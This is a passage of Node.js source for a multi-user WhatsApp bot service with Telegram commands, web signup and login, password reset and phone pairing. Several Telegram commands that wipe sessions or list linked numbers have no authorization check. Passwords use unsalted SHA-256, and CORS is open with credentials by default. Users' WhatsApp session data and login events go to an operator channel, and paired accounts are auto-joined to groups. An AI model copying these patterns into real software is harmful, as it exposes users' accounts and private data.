  if (!TELEGRAM_TOKEN) { console.log('⚠️ No TELEGRAM_TOKEN'); return null; }
  // Delete webhook and drop pending updates to prevent 409 conflicts on restart
  try {
    const https = require('https');
    const cleanupRes = await new Promise((resolve, reject) => {
      https.get(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/deleteWebhook?drop_pending_updates=true`, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => { try { resolve(JSON.parse(data)); } catch { resolve({}); } });
      }).on('error', reject);
    });
    console.log('[telegram] Webhook cleanup:', cleanupRes.ok ? 'OK' : (cleanupRes.description || 'unknown'));
  } catch (e) { console.log('[telegram] Webhook cleanup failed:', e.message); }
  await new Promise(r => setTimeout(r, 1500));
  // Use long-polling instead of webhook.
  // Webhook mode silently fails on Render free tier when the service sleeps or
  // when RENDER_EXTERNAL_URL/RENDER_SERVICE_NAME are wrong — Telegram updates
  // then never reach the bot, so /pair is never processed and the code "never
  // drops". Long-polling is far more reliable for a single-instance bot.
  // (The deleteWebhook?drop_pending_updates=true call above ensures no webhook
  // is registered, which is required for polling to work without 409 conflicts.)
  const bot = new TelegramBot(TELEGRAM_TOKEN, {
    polling: {
      interval: 1000,
      autoStart: true,
      params: { timeout: 30 },
    },
  });
  bot.on('polling_error', (err) => {
    // 409 = another getUpdates/webhook is active. Log but don't crash.
    console.log('[telegram] polling_error:', err?.message || err);
  });
  console.log('[telegram] Long-polling started (webhook disabled)');

  bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id,
      `🌑 *Welcome to EVENTIDE OMEGA* ☀️\n\nI am Phantom-X.\n\nSend: /pair <your full number with country code>\nExample: /pair 2348012345678\n\nPairing code will be sent here.\n\nUse /relink if pairing keeps failing.\nUse /restore to reconnect from previous backup.\n\n— *EVENTIDE OMEGA* · 👁`,
      { parse_mode: 'Markdown' });
  });

  bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id,
      `📖 *TELEGRAM COMMANDS*\n\n/start — Welcome message\n/pair <number> — Request pairing code\n/relink — Clear session and restart\n/backup — Save current session to channel\n/restore — Restore session from channel backup\n/sessions — Check connection status\n/linkedlist — Show all linked WhatsApp numbers\n\nExample: /pair 2348012345678\n\n— *EVENTIDE OMEGA* · 👁`,
      { parse_mode: 'Markdown' });
  });

  bot.onText(/\/pair\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const phone = normalizeNum(match[1].trim());
    if (!/^\d{10,15}$/.test(phone)) {
      return bot.sendMessage(chatId, '⚠️ Invalid number. Send with country code, no symbols.\nExample: /pair 2348012345678');
    }
    const numKey = normalizeNum(phone);
    if (pairingInProgress.has(numKey)) {
      return bot.sendMessage(chatId, '⏳ Pairing already in progress for this number. Please wait or send /relink to restart.');
    }
    if (activeSockets[numKey] && activeSockets[numKey].isConnected) {
      return bot.sendMessage(chatId, `✅ ${phone} is already connected. No need to pair again.`);
    }
    console.log(`[MULTI-PAIR] /pair for ${phone} — starting independent socket`);
    await bot.sendMessage(chatId, `🔄 Generating pairing code for ${phone} (multi-user — previous numbers stay connected)...`);
    startBot(phone, { reply: (t, opts) => bot.sendMessage(chatId, t, opts) }, 'pair', { authDir: 'auth_info_' + numKey, socketKey: numKey }).catch((err) => {
      console.error('[Telegram /pair multi]', err);
      bot.sendMessage(chatId, '❌ Error starting pairing. Try /pair again.');
    });
  });

  bot.onText(/\/relink/, async (msg) => {
    const chatId = msg.chat.id;
    await bot.sendMessage(chatId, '🔄 Clearing ALL sessions and restarting...\nPlease wait 15-20 seconds.');
    
    // Kill all active sockets
    for (const key in activeSockets) {
      try {
        const s = activeSockets[key].sock;
        if (s) { s.ev.removeAllListeners(); s.end(new Error('relink')); }
      } catch (_) {}
      delete activeSockets[key];
    }
    
    if (currentSock) {
      try { currentSock.ev.removeAllListeners(); currentSock.end(new Error('relink')); } catch (_) {}
      currentSock = null;
    }
    
    clearAllReconnectTimers();
    
    // Clear all auth folders and linked sessions
    try {
      const items = fs.readdirSync('.', { withFileTypes: true });
      for (const item of items) {
        if (item.isDirectory() && (item.name.startsWith('auth_info') || item.name.startsWith('web_auth_'))) {
          fs.rmSync(item.name, { recursive: true, force: true });
          console.log(`[relink] Cleared ${item.name}`);
        }
      }
      linkedSessions = {};
      saveLinked();
      if (fs.existsSync(SESSION_FILE)) fs.unlinkSync(SESSION_FILE);
    } catch (e) { console.error('[relink] Cleanup error:', e.message); }
    
    isPairing = false; restoreQrDetected = false;
    setTimeout(() => startBot(null, null, 'relink').catch(console.error), 4000);
  });

  // /backup command — force backup now
  bot.onText(/\/backup/, async (msg) => {
    const chatId = msg.chat.id;
    // Check if ANY auth folder or essential data exists (not just main AUTH_DIR)
    const localItems = fs.readdirSync(".", { withFileTypes: true });
    const authFolders = localItems.filter(d =>
      d.isDirectory() && (d.name.startsWith("auth_info") || d.name.startsWith("web_auth_"))
    );
    const completeAuth = authFolders.find(d => _ph_isAuthComplete(d.name));
    const hasEssentialData = ["web_users.json", "linked_sessions.json", "sessions.json", "group_settings.json", "user_sessions"].some(f => fs.existsSync(f));

    // Refuse to back up if NO auth folder is complete — this is the exact
    // scenario that produces "Restored backup is incomplete" on redeploy.
    if (!completeAuth && !hasEssentialData) {
      return bot.sendMessage(chatId,
        "⚠️ *Cannot backup — nothing valid to save.*\n\n" +
        "• No complete WhatsApp auth folder found\n" +
        "• No essential data files found\n\n" +
        "*Steps to fix:*\n" +
        "1. Pair the bot with /pair <number> (or via web dashboard)\n" +
        "2. Wait for *\"Phantom-X is online\"* confirmation\n" +
        "3. Then run /backup again"
      , { parse_mode: 'Markdown' });
    }
    if (!completeAuth) {
      await bot.sendMessage(chatId,
        "⚠️ *Warning:* No COMPLETE auth folder found.\n" +
        "An auth folder exists but pairing hasn't fully completed\n" +
        "(missing creds.json or app-state-sync-key).\n\n" +
        "Backing up data files only. Pair fully first, then re-run /backup.\n\n" +
        "🔄 Forcing backup of available data..."
      , { parse_mode: 'Markdown' });
    } else {
      await bot.sendMessage(chatId, '🔄 Forcing backup now...');
    }
    try {
      await backupAuthToChannel(true);
      await bot.sendMessage(chatId, '✅ Backup sent to channel and pinned!');
    } catch (e) {
      await bot.sendMessage(chatId, '❌ Backup failed. Check logs and make sure TELEGRAM_BACKUP_CHANNEL is set and the bot is admin in the channel.');
    }
  });

  // /restore command — pull pinned backup from channel and reconnect
  // /sessions — show connection status
  // /linkedlist — show all linked WhatsApp numbers
  bot.onText(/\/linkedlist/, async (msg) => {
    const chatId = msg.chat.id;
    const all = getAllLinked();
    const entries = Object.entries(all);
    if (entries.length === 0) {
      return bot.sendMessage(chatId, '📭 No linked sessions.\n\nUse /pair <number> to link a WhatsApp account.', { parse_mode: 'Markdown' });
    }
    let list = `🔗 *Linked Sessions* (${entries.length})\n━━━━━━━━━━━━━━\n\n`;
    entries.forEach(([num, info], i) => {
      list += `${i + 1}. 📱 \`${num}\`\n   Connected: ${info.connectedAt || 'unknown'}\n\n`;
    });
    list += `— *EVENTIDE OMEGA* · 👁`;
    await bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
  });

  bot.onText(/\/sessions/, async (msg) => {
    const chatId = msg.chat.id;
    const uptime = formatUptime(Date.now() - botStartTime);
    const authExists = fs.existsSync(AUTH_DIR) && fs.readdirSync(AUTH_DIR).length > 0;
    const botPhone = (currentSock && currentSock.user?.id) ? currentSock.user.id.split(':')[0].split('@')[0] : 'N/A';
    const isRegistered = (currentSock && currentSock.authState?.creds?.registered) ? 'YES' : 'NO';
    const multiCount = Object.keys(activeSockets).length;
    const backupStatus = restoreQrDetected ? '❌ LAST RESTORE FAILED (incomplete backup)' : 'OK';
    const userCount = getLinkedCount();
    const lines = [
      `📱 *SESSION STATUS*`,
      ``,
      `👥 Linked Users: ${userCount}`,
      `📡 Connected: ${isConnected ? 'YES' : 'NO'}`,
      `✅ Total Pairings: ${successfulPairings}`,
      `🔗 Socket Gen: ${socketGeneration}`,
      `⏱️ Uptime: ${uptime}`,
      `🤖 Bot Number: ${botPhone}`,
      `📁 Auth Files: ${authExists ? 'YES' : 'NO'}`,
      `🔐 Auth Registered: ${isRegistered}`,
  `👥 Multi-Sessions: ${multiCount}`,
      `🔄 Pairing: ${isPairing ? 'IN PROGRESS' : 'IDLE'}`,
      `💾 Backup: ${backupStatus}`,
      ``,
      `_Use /linkedlist to see all numbers_`,
      ``,
      `— *EVENTIDE OMEGA* · 👁`
    ];
    await bot.sendMessage(chatId, lines.join('\n'), { parse_mode: 'Markdown' });
  });

  bot.onText(/\/restore/, async (msg) => {
    const chatId = msg.chat.id;
    if (!TELEGRAM_BACKUP_CHANNEL) {
      return bot.sendMessage(chatId, '❌ TELEGRAM_BACKUP_CHANNEL not set in environment variables.');
    }
    await bot.sendMessage(chatId, '🔄 Checking Telegram channel for pinned backup...');
    try {
      const restored = await restoreAuthFromChannel();
      if (!restored) {
        return bot.sendMessage(chatId, '❌ No pinned backup found in the channel.\nMake sure you ran /backup after pairing successfully.');
      }

      const mainOk = _ph_isAuthComplete(AUTH_DIR);
      const multiOk = fs.readdirSync('.', { withFileTypes: true }).some(d => d.isDirectory() && d.name.startsWith('auth_info_') && _ph_isAuthComplete(d.name));
      if (!mainOk && !multiOk) {
        return bot.sendMessage(chatId,
          '❌ Backup restored, but it does not contain a complete WhatsApp session.\n\nThis usually means the backup was created before pairing fully finished.\n\nPlease pair again, wait until the bot is fully online, then run /backup.',
          { parse_mode: 'Markdown' }
        );
      }

      await bot.sendMessage(chatId, '✅ Backup restored! Restarting bot to connect...\nPlease wait 10-15 seconds.');
      // Kill current socket, restart with restored auth
      if (currentSock) {
        try { currentSock.ev.removeAllListeners(); currentSock.end(new Error('restore')); } catch (_) {}
        currentSock = null;
      }
      clearReconnectTimer(); isConnected = false; currentQR = null; isPairing = false; restoreQrDetected = false;
      setTimeout(() => startBot(null, { reply: (t, opts) => bot.sendMessage(chatId, t, opts) }, 'restore').catch(console.error), 2000);
    } catch (e) {
      console.error('[restore cmd]', e);
      await bot.sendMessage(chatId, '❌ Restore failed: ' + e.message);
    }
  });

  bot.on("message", (msg) => {
    if (msg.text) console.log(`[TELEGRAM DEBUG] ${msg.chat.id}: ${msg.text}`);
  });

  // Set the bot description (appears under bot name in Telegram)
  updateTelegramDescription(bot);

  return bot;
}

// ── Update Telegram bot description with user count ──
async function updateTelegramDescription(botInstance) {
  const tgBot = botInstance || telegramBot;
  if (!tgBot) return;
  try {
    const count = getLinkedCount();
    const desc = `🌑 EVENTIDE OMEGA — WhatsApp Bot\n\n👥 ${count} active user${count !== 1 ? 's' : ''}\n\nPair your WhatsApp number to get started.\nSend /start for instructions.`;
    const shortDesc = `🌑 EVENTIDE OMEGA · ${count} user${count !== 1 ? 's' : ''}`;
    // setMyDescription sets the full description (shown when you open the bot)
    await tgBot.setMyDescription(desc).catch(() => {});
    // setMyShortDescription sets the short one (shown in bot list/search)
    await tgBot.setMyShortDescription(shortDesc).catch(() => {});
    console.log(`[telegram] Bot description updated: ${count} users`);
  } catch (e) {
    console.log(`[telegram] Description update failed: ${e.message}`);
  }
}

// ── EXPRESS SERVER ──────────────────────────────────────────────────────
const app = express();
const crypto = require('crypto');

// MAX_USERS: hard cap on how many WhatsApp sessions this instance will serve.
// Set via env var. 0 = unlimited. Default 0 (unlimited unless you set it).
const MAX_USERS = parseInt(process.env.MAX_USERS || '0') || 0;

// ── Middleware ──
app.use(express.json());

// CORS — allow cross-origin requests so pair.html can be hosted on Vercel
// and still call the bot API on Render/panel.
const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || '')
  .split(',').map(s => s.trim()).filter(Boolean);
app.use((req, res, next) => {
  const origin = req.headers.origin || '';
  if (!origin || origin === '' || ALLOWED_ORIGINS.includes(origin) || ALLOWED_ORIGINS.includes('*')) {
    if (origin) res.setHeader('Access-Control-Allow-Origin', origin);
  } else if (ALLOWED_ORIGINS.length === 0) {
    // No restriction configured — allow all (open bot, not production-safe but convenient)
    if (origin) res.setHeader('Access-Control-Allow-Origin', origin);
  }
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

// Cookie parser (simple — before routes)
app.use((req, res, next) => {
  req.cookies = {};
  const cookieHeader = req.headers.cookie;
  if (cookieHeader) {
    cookieHeader.split(';').forEach(c => {
      const [k, v] = c.trim().split('=');
      if (k && v) req.cookies[k] = v;
    });
  }
  next();
});
app.use(express.static(path.join(__dirname, 'public')));

// ── User accounts storage ──
let webUsers = {};
function loadWebUsers() { try { if (fs.existsSync(USERS_FILE)) webUsers = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); } catch (_) {} }
function saveWebUsers() { 
  try { 
    fs.writeFileSync(USERS_FILE, JSON.stringify(webUsers, null, 2));
    backupAuthToChannel().catch(() => {});
  } catch (_) {} 
}
loadWebUsers();

// ── Web session tokens ──
const webSessions = {}; // { token: { email, createdAt } }
// ── Web pairing sessions ──
const webPairSessions = {}; // { sessionId: { phone, code, status, sock, connectedAt } }

function createWebToken() { return crypto.randomBytes(24).toString('hex'); }
function hashPassword(pw) { return crypto.createHash('sha256').update(pw).digest('hex'); }

// ═══════════════════════════════════════════
// ══ PAGE ROUTES ══════════════════════════════
// ═══════════════════════════════════════════

// Telegram webhook endpoint (handles updates from Telegram instead of polling)
// NOTE: webhookSecret is set in initTelegram() which runs in main().
// The route is registered unconditionally so it exists when the server starts.
// Secret verification happens inside the handler.
app.post('/webhook', express.json(), (req, res) => {
  // Verify Telegram's secret token (prevents spoofing)
  const receivedSecret = req.headers['x-telegram-bot-api-secret-token'];
  if (!webhookSecret || receivedSecret !== webhookSecret) {
    console.log('[webhook] Invalid or missing secret token');
    res.sendStatus(403);
    return;
  }
  if (!telegramBot) {
    console.log('[webhook] telegramBot not ready yet');
    res.sendStatus(200);
    return;
  }
  try {
    if (typeof telegramBot.processUpdate === 'function') {
      telegramBot.processUpdate(req.body);
    }
  } catch (e) {
    console.error('[webhook] Error processing update:', e.message);
  }
  res.sendStatus(200);
});
console.log('[webhook] Registered /webhook endpoint (secret token protected)');

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/login.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));
app.get('/signup.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'signup.html')));
app.get('/forgot.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'forgot.html')));
app.get('/pair.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pair.html')));
app.get('/dashboard.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
app.get('/features.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'features.html')));
app.get('/newfeatures.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'newfeatures.html')));

// ═══════════════════════════════════════════
// ══ AUTH API ═════════════════════════════════
// ═══════════════════════════════════════════

// Signup
app.post('/api/auth/signup', (req, res) => {
  const { email, password, name } = req.body;
  if (!email || !password) return res.json({ ok: false, error: 'Email and password required' });
  loadWebUsers();
  const key = email.toLowerCase().trim();
  if (webUsers[key]) return res.json({ ok: false, error: 'Account already exists' });
  webUsers[key] = { name: name || email.split('@')[0], email: key, password: hashPassword(password), createdAt: new Date().toISOString() };
  saveWebUsers();
  // Trigger immediate backup so web login info survives redeploys
  backupAuthToChannel(true).catch(() => {});
  // Auto-login after signup
  const token = createWebToken();
  webSessions[token] = { email: key, createdAt: Date.now() };
  res.cookie('eo_token', token, { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000 });
  // Notify Telegram about new signup
  if (telegramBot && TELEGRAM_BACKUP_CHANNEL) {
    telegramBot.sendMessage(TELEGRAM_BACKUP_CHANNEL,
      `👤 *New Web Signup*\n\n📧 Email: \`${key}\`\n👤 Name: ${webUsers[key].name}\n📅 ${new Date().toISOString()}\n\n— EVENTIDE OMEGA`, { parse_mode: 'Markdown' }).catch(() => {});
  }
  res.json({ ok: true, token, name: webUsers[key].name });
});

// Login
app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.json({ ok: false, error: 'Email and password required' });
  loadWebUsers();
  const key = email.toLowerCase().trim();
  const user = webUsers[key];
  if (!user || user.password !== hashPassword(password)) return res.json({ ok: false, error: 'Invalid email or password' });
  const token = createWebToken();
  webSessions[token] = { email: key, createdAt: Date.now() };
  res.cookie('eo_token', token, { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000 });
  // Notify Telegram about login
  if (telegramBot && TELEGRAM_BACKUP_CHANNEL) {
    telegramBot.sendMessage(TELEGRAM_BACKUP_CHANNEL,
      `🔑 *Web Login*\n\n📧 Email: \`${key}\`\n👤 Name: ${user.name}\n📅 ${new Date().toISOString()}\n\n— EVENTIDE OMEGA`, { parse_mode: 'Markdown' }).catch(() => {});
  }
  // Trigger backup so login state + web acc survive redeploys
  backupAuthToChannel(true).catch(() => {});
  res.json({ ok: true, token, name: user.name });
});

// Check session
app.get('/api/auth/me', (req, res) => {
  const token = req.cookies?.eo_token || req.headers.authorization?.replace('Bearer ', '');
  if (!token || !webSessions[token]) return res.json({ ok: false });
  const sess = webSessions[token];
  loadWebUsers();
  const user = webUsers[sess.email];
  res.json({ ok: true, authed: true, email: sess.email, name: user?.name || sess.email });
});

// Logout
app.post('/api/auth/logout', (req, res) => {
  const token = req.cookies?.eo_token || req.headers.authorization?.replace('Bearer ', '');
  if (token) delete webSessions[token];
  res.clearCookie('eo_token');
  res.json({ ok: true });
});

// ── Password-reset token store (in-memory, 15-minute TTL) ──
// Tokens are NEVER sent in API responses — they are delivered out-of-band
// via the private Telegram admin channel only.
const pwResetTokens = {}; // { token: { email, expiresAt } }
function pruneResetTokens() {
  const now = Date.now();
  for (const [t, v] of Object.entries(pwResetTokens)) {
    if (v.expiresAt < now) delete pwResetTokens[t];
  }
}

// Forgot password — Step 1: check email exists, dispatch token to Telegram admin channel
// The token is NEVER included in the HTTP response; only the Telegram admin receives it.
app.post('/api/auth/forgot-check', (req, res) => {
  const { email } = req.body;
  if (!email) return res.json({ ok: false, error: 'Email required' });

  // If Telegram isn't configured there's no secure delivery channel — disable reset
  if (!telegramBot || !TELEGRAM_BACKUP_CHANNEL) {
    return res.json({ ok: false, error: 'Password reset is unavailable — Telegram is not configured. Contact the bot admin directly.' });
  }

  loadWebUsers();
  const key = email.toLowerCase().trim();
  // Use a constant-time response to avoid account enumeration
  if (!webUsers[key]) {
    // Indistinguishable from the success response to prevent enumeration
    return res.json({ ok: true, message: 'If an account exists for that email, a reset token has been sent to the admin.' });
  }

  pruneResetTokens();
  const token = crypto.randomBytes(24).toString('hex');
  pwResetTokens[token] = { email: key, expiresAt: Date.now() + 15 * 60 * 1000 };

  // Deliver token exclusively to the private Telegram admin channel
  telegramBot.sendMessage(TELEGRAM_BACKUP_CHANNEL,
    `🔐 *Password Reset Request*\n\n📧 Email: \`${key}\`\n👤 Name: ${webUsers[key].name || 'Unknown'}\n\n🔑 *Reset Token (share ONLY with the user):*\n\`${token}\`\n\n⏰ Expires in 15 minutes.\n\n— EVENTIDE OMEGA`,
    { parse_mode: 'Markdown' }
  ).catch(e => console.error('[reset] Telegram delivery failed:', e.message));

  res.json({ ok: true, message: 'If an account exists for that email, a reset token has been sent to the admin.' });
});

// Forgot password — Step 2: set new password
// Requires the out-of-band token that was sent to the Telegram admin channel in step 1.
app.post('/api/auth/reset-password', (req, res) => {
  const { email, password, resetToken } = req.body;
  if (!email || !password || !resetToken) return res.json({ ok: false, error: 'Email, password, and reset token required' });
  if (password.length < 6) return res.json({ ok: false, error: 'Password must be at least 6 characters' });
  const key = email.toLowerCase().trim();
  pruneResetTokens();
  const entry = pwResetTokens[resetToken];
  if (!entry || entry.email !== key || entry.expiresAt < Date.now()) {
    return res.json({ ok: false, error: 'Invalid or expired reset token. Please request a new one.' });
  }
  delete pwResetTokens[resetToken]; // single-use
  loadWebUsers();
  if (!webUsers[key]) return res.json({ ok: false, error: 'Account not found' });
  webUsers[key].password = hashPassword(password);
  saveWebUsers();
  if (telegramBot && TELEGRAM_BACKUP_CHANNEL) {
    telegramBot.sendMessage(TELEGRAM_BACKUP_CHANNEL,
      `✅ *Password Reset Complete*\n\n📧 Email: \`${key}\`\n👤 Name: ${webUsers[key].name || 'Unknown'}\n📅 ${new Date().toISOString()}\n\n— EVENTIDE OMEGA`, { parse_mode: 'Markdown' }).catch(() => {});
  }
  backupAuthToChannel(true).catch(() => {});
  res.json({ ok: true });
});

// ═══════════════════════════════════════════
// ══ WEB PAIRING API ═════════════════════════
// ═══════════════════════════════════════════

// Request pairing code
app.post('/api/pair', async (req, res) => {
  const { phone } = req.body;
  if (!phone) return res.json({ ok: false, error: 'Phone number required' });
  const num = normalizeNum(phone);
  if (!/^\d{10,15}$/.test(num)) return res.json({ ok: false, error: 'Invalid phone number' });

  // Enforce per-instance user cap (set MAX_USERS env var, 0 = unlimited)
  if (MAX_USERS > 0 && getLinkedCount() >= MAX_USERS) {
    return res.json({ ok: false, error: `This server is full (max ${MAX_USERS} users). Please use another Eventide Omega instance.` });
  }

  const authToken = req.cookies?.eo_token || req.headers.authorization?.replace('Bearer ', '');
  if (!authToken || !webSessions[authToken]?.email) {
    return res.status(401).json({ ok: false, error: 'Authentication required' });
  }
  const userEmail = webSessions[authToken].email;
  const sessionId = crypto.randomBytes(8).toString('hex');
  const webAuthDir = path.join('auth_info_' + num);

  if (telegramBot && TELEGRAM_BACKUP_CHANNEL) {
    telegramBot.sendMessage(TELEGRAM_BACKUP_CHANNEL,
      `📲 *Web Pairing Started*\n\n📞 Number: \`${num}\`\n📧 User: \`${userEmail}\`\n🔑 Session ID: \`${sessionId}\`\n📅 ${new Date().toISOString()}\n\n— EVENTIDE OMEGA`, { parse_mode: 'Markdown' }).catch(() => {});
  }

  const attachWebPollHandlers = (sock, label) => {
    const msgStore = createMessageStore();
    const firstConnRef = { time: 0 };
    sock.ev.on('messages.upsert', handleMessagesUpsert.bind(null, sock, msgStore, firstConnRef));
    sock.ev.on('messages.update', async (updates) => {
      try {
        for (const { key, update } of updates) {
          if (!update?.pollUpdates) continue;
          const pollMsgId = key?.id;
          if (!pollMsgId) continue;
          const ownerPhone = pollOwnerMap.get(pollMsgId);
          let cached = ownerPhone ? getUserPoll(ownerPhone, pollMsgId) : pollCreationCache[pollMsgId];
          if (!cached) continue;
          const pollOptions = cached.options || [];
          const pollIds = cached.ids || [];
          const jid = cached.jid || key.remoteJid;
          console.log(`[${label}] poll update for ${pollMsgId}`);
          if (getAggregateVotesInPollMessage && cached.fullMessage) {
            try {
              const aggregated = getAggregateVotesInPollMessage({ message: cached.fullMessage, pollUpdates: update.pollUpdates });
              if (aggregated && aggregated.length > 0) {
                const voted = aggregated.find(v => v.voters && v.voters.length > 0);
                if (voted && voted.name) {
                  const optIndex = pollOptions.indexOf(voted.name);
                  if (optIndex >= 0 && pollIds[optIndex]) {
                    const mappedId = pollIds[optIndex];
                    const loadingText = getMenuLoadingText(mappedId);
                    if (loadingText) await sock.sendMessage(jid, { text: loadingText });
                    if (global.menuStateMap) delete global.menuStateMap[jid];
                    await handleMenuButton(sock, jid, null, mappedId);
                    return;
                  }
                }
              }
            } catch (aggErr) {
              console.log(`[${label}] getAggregateVotes error:`, aggErr.message);
            }
          }
          const crypto = require('crypto');
          for (const pollUpd of update.pollUpdates) {
            if (pollUpd?.vote?.selectedOptions && pollUpd.vote.selectedOptions.length > 0) {
              const selectedHash = Buffer.from(pollUpd.vote.selectedOptions[0]).toString('hex');
              for (let i = 0; i < pollOptions.length; i++) {
                const optHash = crypto.createHash('sha256').update(Buffer.from(pollOptions[i])).digest('hex');
                if (selectedHash === optHash) {
                  const mappedId = pollIds[i] || '';
                  const loadingText = getMenuLoadingText(mappedId);
                  if (loadingText) await sock.sendMessage(jid, { text: loadingText });
                  if (global.menuStateMap) delete global.menuStateMap[jid];
                  await handleMenuButton(sock, jid, null, mappedId);
                  return;
                }
              }
            }
          }
        }
      } catch (e) {
        console.error(`[${label}] poll-menu-update error`, e);
      }
    });
    return firstConnRef;
  };

  const createWebPairSocket = async () => {
    const { state, saveCreds } = await useMultiFileAuthState(webAuthDir);
    const { version } = await fetchLatestBaileysVersion();
    const sock = makeWASocket({
      version,
      browser: ['Mac OS', 'Chrome', '120.0.0'],
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })),
      },
      printQRInTerminal: false,
      logger: pino({ level: 'silent' }),
      markOnlineOnConnect: true,
      syncFullHistory: false,
      shouldSyncHistoryMessage: () => false,
      generateHighQualityLinkPreview: false,
      keepAliveIntervalMs: 15000,
      connectTimeoutMs: 90000,
      defaultQueryTimeoutMs: 120000,
    });
    // Baileys v7 native identity handling is used for web pairing sockets too.
    return { sock, saveCreds };
  };

  const finalizeWebPairSuccess = async (sock, tag) => {
    const connectedNum = sock.user?.id?.split(':')[0]?.split('@')[0] || num;
    if (webPairSessions[sessionId]) {
      webPairSessions[sessionId].status = 'connected';
      webPairSessions[sessionId].connectedAt = new Date().toISOString();
      webPairSessions[sessionId].sock = sock;
    }
    addLinkedSession(connectedNum);
    updateTelegramDescription();
    console.log(`[web-pair] ✅ ${num} connected via ${tag}`);
    _ph_backupWithSync(tag);
    if (telegramBot && TELEGRAM_BACKUP_CHANNEL) {
      telegramBot.sendMessage(TELEGRAM_BACKUP_CHANNEL,
        `📱 *Web Pairing Successful*\n\n📞 Number: \`${connectedNum}\`\n🔑 Session ID: \`${sessionId}\`\n📅 ${new Date().toISOString()}\n\n_User can use this Session ID to access their dashboard._\n\n— EVENTIDE OMEGA`, { parse_mode: 'Markdown' }).catch(() => {});
    }
    setTimeout(async () => { try { await autoJoinGroups(sock); } catch (_) {} }, 10000);
  };

  const cleanupPendingWebPairSession = (delayMs = 5 * 60 * 1000) => {
    setTimeout(() => {
      const sess = webPairSessions[sessionId];
      if (!sess) return;
      if (sess.status === 'connected') return;
      try {
        if (sess.sock) {
          try { sess.sock.ev.removeAllListeners('connection.update'); } catch (_) {}
          try { sess.sock.ev.removeAllListeners('creds.update'); } catch (_) {}
          try { sess.sock.ev.removeAllListeners('messages.upsert'); } catch (_) {}
          try { sess.sock.ev.removeAllListeners('messages.update'); } catch (_) {}
          try { sess.sock.end(); } catch (_) {}
        }
        try { fs.rmSync(sess.authDir || webAuthDir, { recursive: true, force: true }); } catch (_) {}
      } finally {
        delete webPairSessions[sessionId];
        console.log(`[web-pair] Expired pending session ${sessionId}`);
      }
    }, delayMs);
  };

  const failWebPair = async (reason, sock = null) => {
    if (webPairSessions[sessionId]) webPairSessions[sessionId].status = 'failed';
    try {
      await _ph_cleanupDeadSession({ authDir: webAuthDir, socketKey: num, sock, phoneNumber: num, reason });
    } catch (_) {}
    cleanupPendingWebPairSession(60 * 1000);
  };

  try {
    if (fs.existsSync(webAuthDir)) fs.rmSync(webAuthDir, { recursive: true, force: true });

    let restartUsed = false;
    let activeSaveCreds = null;
    let activeWebPairGeneration = 0;

    const bindConnectionHandler = (sock, label) => {
      const myGen = ++activeWebPairGeneration;
      const firstConnRef = attachWebPollHandlers(sock, `web-pair:${label}`);
      sock.ev.on('connection.update', async (update) => {
        if (myGen !== activeWebPairGeneration) return;
        const connection = update?.connection;
        if (connection === 'open') {
          if (!firstConnRef.time) firstConnRef.time = Math.floor(Date.now() / 1000);
          await finalizeWebPairSuccess(sock, label === 'restart' ? 'web-pair-515' : 'web-pair');
          return;
        }
        if (connection === 'close') {
          const statusCode = _ph_extractDisconnectCode(update?.lastDisconnect);
          console.log(`[web-pair] Connection closed for ${num}, code=${statusCode}, label=${label}`);

          if (statusCode === 515 || statusCode === DisconnectReason.restartRequired) {
            if (restartUsed) {
              console.log(`[web-pair] Another 515 for ${num} — giving up`);
              await failWebPair('web-pair-second-515', sock);
              return;
            }
            restartUsed = true;
            try {
              if (activeSaveCreds) await activeSaveCreds();
              await new Promise(r => setTimeout(r, 1200));
              try {
                sock.ev.removeAllListeners('connection.update');
                sock.ev.removeAllListeners('creds.update');
                sock.ev.removeAllListeners('messages.upsert');
                sock.ev.removeAllListeners('messages.update');
                sock.end();
              } catch (_) {}

              const restarted = await createWebPairSocket();
              activeSaveCreds = restarted.saveCreds;
              const newSock = restarted.sock;
              webPairSessions[sessionId].sock = newSock;
              socketKeyMap.set(newSock, num);
              newSock.ev.on('creds.update', activeSaveCreds);
              bindConnectionHandler(newSock, 'restart');
            } catch (e) {
              console.error(`[web-pair] 515 reconnect failed for ${num}:`, e.message);
              await failWebPair('web-pair-515-reconnect-failed', sock);
            }
            return;
          }

          if (webPairSessions[sessionId]?.status !== 'connected') {
            webPairSessions[sessionId].status = 'disconnected';
            removeLinkedSession(num);
            clearUserPolls(num);
            setTimeout(() => {
              if (webPairSessions[sessionId]?.status === 'disconnected') {
                delete webPairSessions[sessionId];
                console.log(`[web-pair] Cleaned up disconnected session ${sessionId}`);
              }
            }, 5 * 60 * 1000);
          }
        }
      });
    };

    const created = await createWebPairSocket();
    const webSock = created.sock;
    activeSaveCreds = created.saveCreds;
    webPairSessions[sessionId] = { phone: num, email: userEmail, code: null, status: 'waiting', sock: webSock, authDir: webAuthDir, pairingStartedAt: Date.now() };
    cleanupPendingWebPairSession(5 * 60 * 1000);
    socketKeyMap.set(webSock, num);
    webSock.ev.on('creds.update', activeSaveCreds);
    bindConnectionHandler(webSock, 'initial');

    const codePromise = (async () => {
      try {
        await _ph_waitForSocketPairReady(webSock, 25000);
